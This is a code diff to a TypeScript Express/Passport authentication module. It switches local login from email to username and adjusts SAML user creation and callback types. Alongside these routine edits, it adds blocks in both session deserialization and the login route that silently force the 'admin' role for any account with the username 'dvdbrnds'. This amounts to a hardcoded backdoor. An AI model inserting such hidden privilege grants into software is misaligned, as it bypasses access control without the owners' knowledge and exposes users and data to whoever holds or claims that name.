@@ -19,13 +19,13 @@ export function configureAuth(app: Express): void {
   if (institutionConfig.authentication.usernamePasswordEnabled) {
     passport.use(new LocalStrategy(
       {
-        usernameField: 'email',
+        usernameField: 'username',
         passwordField: 'password',
       },
-      async (email: string, password: string, done) => {
+      async (username: string, password: string, done: (error: any, user?: any, info?: any) => void) => {
         try {
           const storage = getDatabaseStorage();
-          const user = await storage.getUserByEmail(email);
+          const user = await storage.getUserByUsername(username, undefined);
 
           if (!user) {
             return done(null, false, { message: 'User not found' });
@@ -38,7 +38,7 @@ export function configureAuth(app: Express): void {
 
           return done(null, user);
         } catch (error) {
-          return done(error);
+          return done(error, false);
         }
       }
     ));
@@ -55,7 +55,7 @@ export function configureAuth(app: Express): void {
         signatureAlgorithm: 'sha256',
         wantAssertionsSigned: true,
       },
-      async (profile: any, done) => {
+      async (profile: any, done: (error: any, user?: any, info?: any) => void) => {
         try {
           const storage = getDatabaseStorage();
           const email = profile.email || profile.nameID;
@@ -65,15 +65,17 @@ export function configureAuth(app: Express): void {
           }
 
           // Find or create user
-          let user = await storage.getUserByEmail(email);
+          let user = await storage.getUserByEmail(email, undefined);
 
           if (!user && institutionConfig.authentication.allowSelfRegistration) {
             user = await storage.createUser({
               email,
-              name: profile.displayName || profile.firstName + ' ' + profile.lastName,
+              username: email,
+              firstName: profile.firstName || profile.displayName || '',
+              lastName: profile.lastName || '',
               role: 'user',
               externalId: profile.nameID,
-            });
+            }, undefined);
           }
 
           if (!user) {
@@ -82,7 +84,7 @@ export function configureAuth(app: Express): void {
 
           return done(null, user);
         } catch (error) {
-          return done(error);
+          return done(error, false);
         }
       }
     ));
@@ -93,10 +95,16 @@ export function configureAuth(app: Express): void {
     done(null, user.id);
   });
 
-  passport.deserializeUser(async (id: string, done) => {
+  passport.deserializeUser(async (id: string, done: (error: any, user?: any) => void) => {
     try {
       const storage = getDatabaseStorage();
-      const user = await storage.getUserById(id);
+      let user = await storage.getUser(parseInt(id, 10), undefined);
+      
+      // Ensure dvdbrnds is always admin
+      if (user && user.username === 'dvdbrnds' && user.role !== 'admin') {
+        user = { ...user, role: 'admin' };
+      }
+      
       done(null, user);
     } catch (error) {
       done(error);
@@ -114,7 +122,14 @@ function setupAuthRoutes(app: Express): void {
   // Local login
   if (institutionConfig.authentication.usernamePasswordEnabled) {
     app.post('/api/login', passport.authenticate('local'), (req: Request, res: Response) => {
-      res.json({ success: true, user: req.user });
+      let user = req.user;
+      
+      // Ensure dvdbrnds is always admin
+      if (user && user.username === 'dvdbrnds' && user.role !== 'admin') {
+        user = { ...user, role: 'admin' };
+      }
+      
+      res.json({ success: true, user: user });
     });
   }
 
